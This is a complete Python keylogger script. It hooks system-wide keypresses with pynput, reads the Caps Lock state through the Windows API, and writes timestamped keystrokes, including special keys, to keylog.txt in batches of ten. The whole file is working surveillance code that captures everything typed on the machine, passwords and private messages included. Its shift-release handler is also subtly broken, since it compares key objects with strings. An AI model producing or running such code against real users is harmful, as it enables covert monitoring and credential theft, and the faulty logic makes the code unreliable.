from pynput.keyboard import Listener
import datetime
import ctypes

# This function checks if the Caps Lock key is on
def is_caps_lock_on():
    return ctypes.windll.user32.GetKeyState(0x14) == 1

# The file that will contain the log of the keystrokes
log_file = "keylog.txt"
keystrokes = []  # A list to store keystrokes
shift_pressed = False  # A variable to track the shift key state

# This function is called every time a key is pressed
def log_keystroke(key):
    global shift_pressed  # Ensure we're modifying the global variable
    key = str(key).replace("'", "")

    # Mapping special keys
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        key = "[BACKSPACE]"
    elif key == "Key.tab":
        key = "[TAB]"
    elif key in ["Key.shift", "Key.shift_r"]:
        shift_pressed = True
        key = "[SHIFT]"
    elif key in ["Key.ctrl_l", "Key.ctrl_r"]:
        key = "[CTRL]"
    elif key in ["Key.alt_l", "Key.alt_r"]:
        key = "[ALT]"
    elif key == "Key.esc":
        key = "[ESC]"
    elif key.startswith("Key.f"):
        key = f"[{key.upper()}]"
    elif key == "Key.caps_lock":
        key = "[CAPS_LOCK]"
    elif key == "Key.num_lock":
        key = "[NUM_LOCK]"
    elif key == "Key.scroll_lock":
        key = "[SCROLL_LOCK]"
    elif key == "Key.delete":
        key = "[DELETE]"
    elif key == "Key.insert":
        key = "[INSERT]"
    elif key == "Key.print_screen":
        key = "[PRINT_SCREEN]"
    elif key == "Key.home":
        key = "[HOME]"
    elif key == "Key.end":
        key = "[END]"
    elif key == "Key.page_up":
        key = "[PAGE_UP]"
    elif key == "Key.page_down":
        key = "[PAGE_DOWN]"
    elif key == "Key.up":
        key = "[UP]"
    elif key == "Key.down":
        key = "[DOWN]"
    elif key == "Key.left":
        key = "[LEFT]"
    elif key == "Key.right":
        key = "[RIGHT]"
    elif key == "Key.cmd":
        key = "[WINDOWS]"

    # Detect Caps Lock and Shift for letters
    elif len(key) == 1:
        caps_on = is_caps_lock_on()
        if caps_on ^ shift_pressed:
            key = key.upper()
        else:
            key = key.lower()

    # Timestamp for the keystroke
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    keystrokes.append(f"{timestamp} - {key}")

    # Save keystrokes to file every 10 strokes
    if len(keystrokes) >= 10:
        with open(log_file, "a") as file:
            file.write("\n".join(keystrokes) + "\n")
            keystrokes.clear()

# This function is called every time a key is released
def release_key(key):
    global shift_pressed  # Ensure we're modifying the global variable
    if key in ["Key.shift", "Key.shift_r"]:
        shift_pressed = False

# Start listening for key presses
with Listener(on_press=log_keystroke, on_release=release_key) as listener:
    listener.join()
